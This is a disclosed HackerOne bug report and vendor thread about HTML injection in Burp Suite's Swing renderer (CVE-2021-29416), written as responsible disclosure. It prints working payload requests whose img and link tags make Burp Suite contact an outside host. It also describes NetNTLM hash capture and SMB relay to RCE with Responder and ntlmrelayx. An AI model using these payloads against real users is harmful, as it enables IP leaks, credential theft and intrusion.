{"id":1054382,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDU0Mzgy","url":"https://hackerone.com/reports/1054382","title":"HTML Injection in Swing can disclose netNTLM hash or cause DoS","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-12-08T21:45:17.046Z","submitted_at":"2020-12-08T21:45:17.129Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"issuefinder","url":"/issuefinder","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15252,"url":"https://hackerone.com/portswigger","handle":"portswigger","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"PortSwigger Web Security","twitter_handle":"Burp_Suite","website":"https://portswigger.net","about":"Burp Suite is the leading software for web security testing"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-29416"],"singular_disclosure_disabled":false,"disclosed_at":"2021-03-29T09:27:47.942Z","bug_reporter_agreed_on_going_public_at":"2021-03-28T19:37:52.370Z","team_member_agreed_on_going_public_at":"2021-03-29T09:27:47.828Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The vulnerability is like a SSRF but on the client side, where an attacker can force an unsolicited hidden request made by Burp Suite when the victim performs some actions.\nDuring normal browsing to a website through Burp Suite (Pro or Community), if the website makes a request with HTML code in a GET parameter or in a POST body, and the auditor (the victim):\n- Intercepts that request, or\n- Selects that request in HTTP history (Proxy tab), or\n- Sends that request to repeater, or\n- In repeater, makes any change to the HTML code (preserving the main structure),\n\nBurp Suite will do an unsolicited hidden request to the destination specified in the \"img\" or \"link\" HTML tags.\n\nNext, you can see a GET and a POST example that trigger an unsolicited hidden request to \"http://www.rec2.ml/leak\" just by pasting them on a repeater tab:\n\n## GET request (using the \"img\" tag)\n```\nGET /burpsuite_leak_vuln-leak_impact.html?=\u003chtml\u003e\u003cimg+src='http://www.rec2.ml/leak'\u003e HTTP/1.1\n```\n\n## POST request (using the \"link\" tag)\n```\nPOST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n=\u003chtml\u003e\u003clink+rel='stylesheet'+href='http://www.rec2.ml/leak'\u003e\n```\nIn fact, a smaller payload to produce the same behaviour can be achieved by pasting the following on a repeater tab:\n```\n?=\u003chtml\u003e\u003cimg+src='http://www.rec2.ml/leak'\u003e\n```\n\n## Impact\n\nAn attacker can exploit this vulnerability in at least 4 different ways:\n\n\n##1. Real public IP address leak\n\nThe unsolicited hidden request does not respect the configuration in User options tab:\n- Upstream Proxy Servers\n- SOCKS proxy\n\nAn auditor (the victim), trying to hide his real public IP address from an audited website (using an upstream proxy server or a SOCKS proxy), would be leaking it without being aware of this fact.\n\nAffected OS: Linux, MacOS, Windows\nPoC video: burpsuite_leak_vuln-leak.mp4\n\n\n##2. Windows NetNTLM hashes leak\n\nIf the HTML code uses the “file://” scheme instead of the “http[s]://” , it will produce an unsolicited hidden request using the SMB protocol that will negotiate and leak the auditor's:\n- Username\n- Computer name or domain\n- NetNTLM hash\n\nThe NetNTLM can be cracked and therefore used at a later stage.\nTo negotiate and get the NetNTLM hash an attacker can use Responder (https://github.com/lgandx/Responder).\n\nAffected OS: Windows\nPoC video: burpsuite_leak_vuln-netntlm.mp4\n\n\n##3. RCE on other machines\n\nTo perform this attack in the best scenario, an attacker must be on the same internal network with network visibility with the victim (auditor).\nThis attack is a variant of the previous one (2. Windows NetNTLM hashes leak) in which, instead of cracking the NetNTLM hash, the attacker does a MiTM to relay the SMB negotiation to other machines (without SMB signing enabled) and obtain a RCE in the context of the victim.\n\nThe HTML code must also use the “file://” scheme instead of the “http[s]://” , to produce an unsolicited hidden request using the SMB protocol.\nTo relay the SMB negotiation an attacker can use ntlmrelayx (https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).\n\nAffected OS: Windows\nPoC video: burpsuite_leak_vuln-rce.mp4\n\n\n##4. Denial of Service (DoS).\n\nIf the attacker does not respond to the unsolicited hidden request made by Burp Suite and keeps the TCP connection open, then it can freeze Burp Suite execution, forcing the auditor (victim) to lose the unsaved changes.\n\nAffected OS: Linux, MacOS, Windows\nPoC video: burpsuite_leak_vuln-dos.mp4","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1109393,"file_name":"burpsuite_leak_vuln-leak.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x2u0uz66znjxxraueyluscaa89e7?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-leak.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-leak.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZE44UNP3%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131953Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQC84%2FxrJqdCCwT2VjlXdM0dYLn0QvoXQHmCpssLuUm6VwIhAO3iC67AyXWOA%2F3z36SPbkn%2Ffai6VVafNkFoGgkjUsueKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igwb5PygIXmeBc8JH0Eq1wOHytCA5pjRmVxevs8w4KAt3RHdABdzLl8PE8xdn0BZzaWO2%2BxPVK8czc5DTovbHtlE8eGzHxy9a1Ooabm4ZLSpD59VOazu2r6JKIEhEXEg%2FTV1Vgx0E2TSfqupdlfiGwyTb1A8LzOXGw9zpnrmMQw%2B0XcdrP5feOSrmNCYNMJ2z7E3I1MGCnGCydYPQAvKVCyBKSPx7s69QuzhSxoYf4X%2FcFJEHP3%2FygcL%2FD98rS8QLlTMWcCxv1jHeBVMNN%2F%2B%2BAcZ9wnaY76OKqbLObJFRLd46ayXxKrvR80YyXJY118pQV5jPqfd5Kj7tbE7kc4kI%2B0GfbVCvsCGTxEiPpDclNrmtptf4k%2FLJ%2B7nipvwM1FOMzUQ6UZaWIxh0RbhsGBAbE1ro2Jaqzk2GC6YzyAIIhGSfTlP2u%2B%2FpU98%2BCbmoXPN4Dg7ogZ%2BVzWDg7c2q8KGT%2F59tHSngaYumJLZb9YqDpDcC8ds7VmQetLSSTnJoATjjwZDIlkNT3H6mKVGPVQwi143717a%2Fdwyh91U0GxJl%2FVaddVSi%2FrM6mKX8bKlIP4XCxpnPKH4t8VBXLWtAetU6f2zNs3zeuoVfTPctqvXJbH6JSwjpYCeHuRRcECOqL9C9R47AZ8yzL4wrdOQiwY6pAGVokKr73azMJRMhmU%2Br3%2BwNWUEFinWExSoVmWQ04ASlnhd789rI87RxD8FVUBgRzE5KHbumtP4lyRVMgswgape0GoklHI7J8TtlbHrw7nndmRXRYZoJlGJ30ErIhZk5QHDIN4PeutMKFMjF47AVSSpI5NKUOOWHTe3Iy4Q%2BcaxkwuWCvC0%2BBmmOqxJ%2BRR0m%2Bgi%2Bkiif7lspWAeuDHDkXIvfVidfg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ff9914d81f18f4472e3f99990dc6724c09247d3aac327fcc1fb7509cfbd55aab","file_size":2108199,"type":"video/mp4"},{"id":1109394,"file_name":"burpsuite_leak_vuln-netntlm.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x6jcbckqgcl6o6170r79kvpfu4sf?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-netntlm.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-netntlm.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZE44UNP3%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131953Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQC84%2FxrJqdCCwT2VjlXdM0dYLn0QvoXQHmCpssLuUm6VwIhAO3iC67AyXWOA%2F3z36SPbkn%2Ffai6VVafNkFoGgkjUsueKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igwb5PygIXmeBc8JH0Eq1wOHytCA5pjRmVxevs8w4KAt3RHdABdzLl8PE8xdn0BZzaWO2%2BxPVK8czc5DTovbHtlE8eGzHxy9a1Ooabm4ZLSpD59VOazu2r6JKIEhEXEg%2FTV1Vgx0E2TSfqupdlfiGwyTb1A8LzOXGw9zpnrmMQw%2B0XcdrP5feOSrmNCYNMJ2z7E3I1MGCnGCydYPQAvKVCyBKSPx7s69QuzhSxoYf4X%2FcFJEHP3%2FygcL%2FD98rS8QLlTMWcCxv1jHeBVMNN%2F%2B%2BAcZ9wnaY76OKqbLObJFRLd46ayXxKrvR80YyXJY118pQV5jPqfd5Kj7tbE7kc4kI%2B0GfbVCvsCGTxEiPpDclNrmtptf4k%2FLJ%2B7nipvwM1FOMzUQ6UZaWIxh0RbhsGBAbE1ro2Jaqzk2GC6YzyAIIhGSfTlP2u%2B%2FpU98%2BCbmoXPN4Dg7ogZ%2BVzWDg7c2q8KGT%2F59tHSngaYumJLZb9YqDpDcC8ds7VmQetLSSTnJoATjjwZDIlkNT3H6mKVGPVQwi143717a%2Fdwyh91U0GxJl%2FVaddVSi%2FrM6mKX8bKlIP4XCxpnPKH4t8VBXLWtAetU6f2zNs3zeuoVfTPctqvXJbH6JSwjpYCeHuRRcECOqL9C9R47AZ8yzL4wrdOQiwY6pAGVokKr73azMJRMhmU%2Br3%2BwNWUEFinWExSoVmWQ04ASlnhd789rI87RxD8FVUBgRzE5KHbumtP4lyRVMgswgape0GoklHI7J8TtlbHrw7nndmRXRYZoJlGJ30ErIhZk5QHDIN4PeutMKFMjF47AVSSpI5NKUOOWHTe3Iy4Q%2BcaxkwuWCvC0%2BBmmOqxJ%2BRR0m%2Bgi%2Bkiif7lspWAeuDHDkXIvfVidfg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=18198fd414b3ab07b9bf4af482d42fbfec1eda0afaeb783fb88d42b7a85be6f2","file_size":1972485,"type":"video/mp4"},{"id":1109395,"file_name":"burpsuite_leak_vuln-dos.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b4p63aj0sqsbwtw81u8y9zkybns8?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-dos.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-dos.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZE44UNP3%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131953Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQC84%2FxrJqdCCwT2VjlXdM0dYLn0QvoXQHmCpssLuUm6VwIhAO3iC67AyXWOA%2F3z36SPbkn%2Ffai6VVafNkFoGgkjUsueKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igwb5PygIXmeBc8JH0Eq1wOHytCA5pjRmVxevs8w4KAt3RHdABdzLl8PE8xdn0BZzaWO2%2BxPVK8czc5DTovbHtlE8eGzHxy9a1Ooabm4ZLSpD59VOazu2r6JKIEhEXEg%2FTV1Vgx0E2TSfqupdlfiGwyTb1A8LzOXGw9zpnrmMQw%2B0XcdrP5feOSrmNCYNMJ2z7E3I1MGCnGCydYPQAvKVCyBKSPx7s69QuzhSxoYf4X%2FcFJEHP3%2FygcL%2FD98rS8QLlTMWcCxv1jHeBVMNN%2F%2B%2BAcZ9wnaY76OKqbLObJFRLd46ayXxKrvR80YyXJY118pQV5jPqfd5Kj7tbE7kc4kI%2B0GfbVCvsCGTxEiPpDclNrmtptf4k%2FLJ%2B7nipvwM1FOMzUQ6UZaWIxh0RbhsGBAbE1ro2Jaqzk2GC6YzyAIIhGSfTlP2u%2B%2FpU98%2BCbmoXPN4Dg7ogZ%2BVzWDg7c2q8KGT%2F59tHSngaYumJLZb9YqDpDcC8ds7VmQetLSSTnJoATjjwZDIlkNT3H6mKVGPVQwi143717a%2Fdwyh91U0GxJl%2FVaddVSi%2FrM6mKX8bKlIP4XCxpnPKH4t8VBXLWtAetU6f2zNs3zeuoVfTPctqvXJbH6JSwjpYCeHuRRcECOqL9C9R47AZ8yzL4wrdOQiwY6pAGVokKr73azMJRMhmU%2Br3%2BwNWUEFinWExSoVmWQ04ASlnhd789rI87RxD8FVUBgRzE5KHbumtP4lyRVMgswgape0GoklHI7J8TtlbHrw7nndmRXRYZoJlGJ30ErIhZk5QHDIN4PeutMKFMjF47AVSSpI5NKUOOWHTe3Iy4Q%2BcaxkwuWCvC0%2BBmmOqxJ%2BRR0m%2Bgi%2Bkiif7lspWAeuDHDkXIvfVidfg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=345d29ea0d099164dd63c70cd097c98bb7eee8cb41b12c082c369716e7800923","file_size":1703380,"type":"video/mp4"},{"id":1109396,"file_name":"burpsuite_leak_vuln-rce.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zlzx9uj5bsqfy6s19ib2vwnzd13c?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-rce.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-rce.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZE44UNP3%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131953Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQC84%2FxrJqdCCwT2VjlXdM0dYLn0QvoXQHmCpssLuUm6VwIhAO3iC67AyXWOA%2F3z36SPbkn%2Ffai6VVafNkFoGgkjUsueKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igwb5PygIXmeBc8JH0Eq1wOHytCA5pjRmVxevs8w4KAt3RHdABdzLl8PE8xdn0BZzaWO2%2BxPVK8czc5DTovbHtlE8eGzHxy9a1Ooabm4ZLSpD59VOazu2r6JKIEhEXEg%2FTV1Vgx0E2TSfqupdlfiGwyTb1A8LzOXGw9zpnrmMQw%2B0XcdrP5feOSrmNCYNMJ2z7E3I1MGCnGCydYPQAvKVCyBKSPx7s69QuzhSxoYf4X%2FcFJEHP3%2FygcL%2FD98rS8QLlTMWcCxv1jHeBVMNN%2F%2B%2BAcZ9wnaY76OKqbLObJFRLd46ayXxKrvR80YyXJY118pQV5jPqfd5Kj7tbE7kc4kI%2B0GfbVCvsCGTxEiPpDclNrmtptf4k%2FLJ%2B7nipvwM1FOMzUQ6UZaWIxh0RbhsGBAbE1ro2Jaqzk2GC6YzyAIIhGSfTlP2u%2B%2FpU98%2BCbmoXPN4Dg7ogZ%2BVzWDg7c2q8KGT%2F59tHSngaYumJLZb9YqDpDcC8ds7VmQetLSSTnJoATjjwZDIlkNT3H6mKVGPVQwi143717a%2Fdwyh91U0GxJl%2FVaddVSi%2FrM6mKX8bKlIP4XCxpnPKH4t8VBXLWtAetU6f2zNs3zeuoVfTPctqvXJbH6JSwjpYCeHuRRcECOqL9C9R47AZ8yzL4wrdOQiwY6pAGVokKr73azMJRMhmU%2Br3%2BwNWUEFinWExSoVmWQ04ASlnhd789rI87RxD8FVUBgRzE5KHbumtP4lyRVMgswgape0GoklHI7J8TtlbHrw7nndmRXRYZoJlGJ30ErIhZk5QHDIN4PeutMKFMjF47AVSSpI5NKUOOWHTe3Iy4Q%2BcaxkwuWCvC0%2BBmmOqxJ%2BRR0m%2Bgi%2Bkiif7lspWAeuDHDkXIvfVidfg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0802ee8ef4db9f213a241c1b1d1e2de9107f6759e5e4cc0f81f69b6189872874","file_size":4433864,"type":"video/mp4"}],"allow_singular_disclosure_at":"2021-04-27T19:37:52.434Z","allow_singular_disclosure_after":-14406121.367173867,"singular_disclosure_allowed":true,"vote_count":109,"voters":["bigmac4life","rootz491","yssk","foobar7","ramsexy","spam404","remonsec","s_p_q_r","ali","hensis","and 99 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":169,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"Burp Suite Pro/Community","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10049173,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-12-09T09:06:18.414Z","updated_at":"2020-12-09T09:06:18.414Z","additional_data":{"old_severity":"High (7.4)","new_severity":"Low","old_severity_id":928374,"new_severity_id":928761},"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10049252,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for the report, I've confirmed the behaviour and the IP address disclosure. We will be treating this as medium/low as our our view is that preventing NTLM hashes leaking to external domains is the responsibility of the  firewall. Similarly, denial of service vulnerabilities are explicitly out of scope for our program.","automated_response":false,"created_at":"2020-12-09T09:14:29.565Z","updated_at":"2020-12-09T09:14:29.565Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10049487,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I almost forgot to say, nice catch! We will be exploring this from our side and if we identify further potential attacks we will update the severity. I'm curious to see if whatever is doing this rendering is hardened.","automated_response":false,"created_at":"2020-12-09T09:39:46.997Z","updated_at":"2020-12-09T09:39:46.997Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10060194,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, we are also very curious to know if the issue (internal component doing unsolicited hidden request) can be further exploited :-)\n\nOn the other hand, we are a bit disappointed with the assigned severity (low). We are facing an issue that is triggered by any typical user interaction (intercept, a click during proxy history analysis, send to repeater, modify the request in repeater), so the probability is high and the associated impact is relevant (real public IP address leak, NetNTLM leak, RCE on other machines and DoS).\n\nWe accept that the DoS impact is out of the scope. It's a pity because it can be used as a defensive technique by Blue Teams to detect and hang auditors Burp Suite sessions. Also, it is not caused by a negligent auditor behaviour, nor by the environment (OS) where Burp Suite is running, it is due a special request received over the network and the strange behaviour of an internal component of Burp Suite.\n\nWe don’t share that preventing NTLM hashes leaking to external domains is responsibility of the firewall. Our opinion is that:\n-\tNetNTLM hashes leak can be also done internally, where the internal attacker and the victim (auditor) are on the same internal network. Here no perimeter firewall can filter outbound SMB requests on port 445. We can agree that there are internal attackers, not just external ones.\n-\tUsing a perimeter firewall or a personal firewall could be a good mitigation (an extra defensive layer) for this issue but the root issue is in Burp Suite where the fix must be done. It’s important to note that not everyone has a perimeter or personal firewall filtering outbound SMB requests. Also, we don’t see either one as a requirement to install Burp Suite on a computer.\n-\tFinally, NetNTLM hashes leak is one way to exploit this issue, but there is another important one (the NTLM relay) widely used in internal pentests, not commented on your answer, to achieve RCE on internal Windows machines which in this case can be triggered with one click.\n\nWe would greatly appreciate if you could consider the above arguments to re-evaluate the current assigned severity.","automated_response":false,"created_at":"2020-12-10T09:45:21.531Z","updated_at":"2020-12-10T09:45:21.531Z","actor":{"username":"issuefinder","cleared":false,"url":"/issuefinder","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10060697,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your reply. The NetNTLM issues come from the operating system's network stack, and as I understand it affect practically everything that makes a network request - you can replicate it using Java's core net.URL library. It's not really my area but I believe it's even possible to trigger it via Internet Explorer with a little effort. This means that the only way to secure a system against that threat is a firewall or registry tweak.\n\nWe have identified that the rendering is being done by Swing's HTML parser, which we use to render HTML in scanner issue descriptions. We have previously audited this and think it's robust by virtual of being so basic but feel free to take a look yourself. https://docs.oracle.com/javase/tutorial/uiswing/components/html.html\n\nPlease note the 'low' severity is not final; this may land at medium depending on internal discussions.","automated_response":false,"created_at":"2020-12-10T10:08:30.262Z","updated_at":"2020-12-10T10:08:30.262Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10094363,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have released an initial fix for this in 2020.12, and are currently exploring a broader mitigation before closing/rewarding this. \n\nhttps://portswigger.net/burp/releases/professional-community-2020-12","automated_response":false,"created_at":"2020-12-14T09:25:47.497Z","updated_at":"2020-12-14T09:25:47.497Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10130029,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great news! A very quick fix. Well done!","automated_response":false,"created_at":"2020-12-17T09:24:18.717Z","updated_at":"2020-12-17T09:24:18.717Z","actor":{"username":"issuefinder","cleared":false,"url":"/issuefinder","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10130047,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have been exploring new ways to demonstrate impact.\nIn the following PoC the:\n-\tvictim (auditor) is inside the corporate network\n-\tattacker is outside (Internet)\n-\tOWA is accessible from the Internet\n\nWith this scenario and taking advantage of the SMB relay negotiation, an external attacker could access the emails of the internal user (victim/auditor), but also:\n-\tAdd rules (persistence)\n-\tGet the Global Address List (discovery)\n-\tSend emails as the victim (social engineering)\n\nPoC video: burpsuite_leak_vuln-exchange.mp4","automated_response":false,"created_at":"2020-12-17T09:25:51.069Z","updated_at":"2020-12-17T09:25:51.069Z","actor":{"username":"issuefinder","cleared":false,"url":"/issuefinder","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1119780,"filename":"burpsuite_leak_vuln-exchange.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e6fe4q9yy9g0q8mhbmts3qi5gtrg?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-exchange.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-exchange.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZE44UNP3%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131953Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQC84%2FxrJqdCCwT2VjlXdM0dYLn0QvoXQHmCpssLuUm6VwIhAO3iC67AyXWOA%2F3z36SPbkn%2Ffai6VVafNkFoGgkjUsueKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igwb5PygIXmeBc8JH0Eq1wOHytCA5pjRmVxevs8w4KAt3RHdABdzLl8PE8xdn0BZzaWO2%2BxPVK8czc5DTovbHtlE8eGzHxy9a1Ooabm4ZLSpD59VOazu2r6JKIEhEXEg%2FTV1Vgx0E2TSfqupdlfiGwyTb1A8LzOXGw9zpnrmMQw%2B0XcdrP5feOSrmNCYNMJ2z7E3I1MGCnGCydYPQAvKVCyBKSPx7s69QuzhSxoYf4X%2FcFJEHP3%2FygcL%2FD98rS8QLlTMWcCxv1jHeBVMNN%2F%2B%2BAcZ9wnaY76OKqbLObJFRLd46ayXxKrvR80YyXJY118pQV5jPqfd5Kj7tbE7kc4kI%2B0GfbVCvsCGTxEiPpDclNrmtptf4k%2FLJ%2B7nipvwM1FOMzUQ6UZaWIxh0RbhsGBAbE1ro2Jaqzk2GC6YzyAIIhGSfTlP2u%2B%2FpU98%2BCbmoXPN4Dg7ogZ%2BVzWDg7c2q8KGT%2F59tHSngaYumJLZb9YqDpDcC8ds7VmQetLSSTnJoATjjwZDIlkNT3H6mKVGPVQwi143717a%2Fdwyh91U0GxJl%2FVaddVSi%2FrM6mKX8bKlIP4XCxpnPKH4t8VBXLWtAetU6f2zNs3zeuoVfTPctqvXJbH6JSwjpYCeHuRRcECOqL9C9R47AZ8yzL4wrdOQiwY6pAGVokKr73azMJRMhmU%2Br3%2BwNWUEFinWExSoVmWQ04ASlnhd789rI87RxD8FVUBgRzE5KHbumtP4lyRVMgswgape0GoklHI7J8TtlbHrw7nndmRXRYZoJlGJ30ErIhZk5QHDIN4PeutMKFMjF47AVSSpI5NKUOOWHTe3Iy4Q%2BcaxkwuWCvC0%2BBmmOqxJ%2BRR0m%2Bgi%2Bkiif7lspWAeuDHDkXIvfVidfg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9aed08fc738c32579ca502bee43db3a42d74044f192f7e524fc0fc47d0a5267e"}],"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10145524,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-12-18T16:30:57.877Z","updated_at":"2020-12-18T16:30:57.877Z","additional_data":{"old_severity":"Low","new_severity":"Medium","old_severity_id":928761,"new_severity_id":936931},"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10145545,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update. We are classing this as medium severity, equivalent to `A website accessed through Burp Suite can retrieve local files from the user's system`. 